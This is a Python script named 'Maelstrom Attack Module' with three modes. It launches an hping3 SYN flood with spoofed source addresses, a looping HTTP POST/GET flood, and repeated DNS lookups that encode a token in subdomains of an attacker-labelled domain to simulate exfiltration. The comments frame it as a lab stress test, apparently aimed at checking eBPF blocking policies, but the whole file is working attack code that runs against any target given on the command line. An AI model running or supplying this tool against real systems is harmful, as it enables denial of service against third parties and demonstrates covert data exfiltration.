import argparse
import subprocess
import time
import requests
import os

def run_syn_flood(target, duration):
    """Phase 1: L3/L4 Stress Test via hping3"""
    print(f"[!] Phase 1: Launching SYN Flood against {target}")
    
    # --flood: send packets as fast as possible
    # -S: SYN flag, -p 80: target port, --rand-source: spoof source IPs
    cmd = f"sudo hping3 --flood -S -p 80 {target} --rand-source"
    
    process = subprocess.Popen(cmd.split())
    time.sleep(duration)
    process.terminate()
    print("[+] Phase 1 Complete.")

def run_l7_injection(target, duration):
    """Phase 2: HTTP Method Abuse (POST vs GET)"""
    print(f"[!] Phase 2: Launching L7 Method Hijacking on {target}")
    end_time = time.time() + duration
    payload = {"data": "malicious_activity_simulated", "vector": "maelstrom"}
    
    while time.time() < end_time:
        try:
            # Sending a POST request (targeted for eBPF policy blocking)
            requests.post(f"http://{target}/v1/data", json=payload, timeout=1)
            # Sending a GET request (simulating legitimate background noise)
            requests.get(f"http://{target}/v1/data", timeout=1)
        except requests.exceptions.RequestException:
            # Ignore connection errors during the flood phase
            pass 
    print("[+] Phase 2 Complete.")

def run_dns_exfil(target, duration):
    """Phase 3: DNS Query Exfiltration Simulation"""
    print(f"[!] Phase 3: Launching DNS Exfiltration attempts")
    
    # Simulate exfiltration by encoding data within the subdomain
    secret_data = "exfil_token_12345"
    cmd = f"nslookup {secret_data}.attacker.maelstrom.lab {target}"
    
    end_time = time.time() + duration
    while time.time() < end_time:
        # Running query in 'low-and-slow' mode to mimic stealthy exfiltration
        subprocess.run(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2) 
    print("[+] Phase 3 Complete.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Maelstrom Attack Module")
    parser.add_argument("--type", choices=['syn-flood', 'l7-inject', 'dns-exfil'], required=True)
    parser.add_argument("--target", required=True, help="Target IP or Domain")
    parser.add_argument("--time", type=int, default=30, help="Duration of the attack in seconds")
    
    args = parser.parse_args()

    if args.type == 'syn-flood':
        run_syn_flood(args.target, args.time)
    elif args.type == 'l7-inject':
        run_l7_injection(args.target, args.time)
    elif args.type == 'dns-exfil':
        run_dns_exfil(args.target, args.time)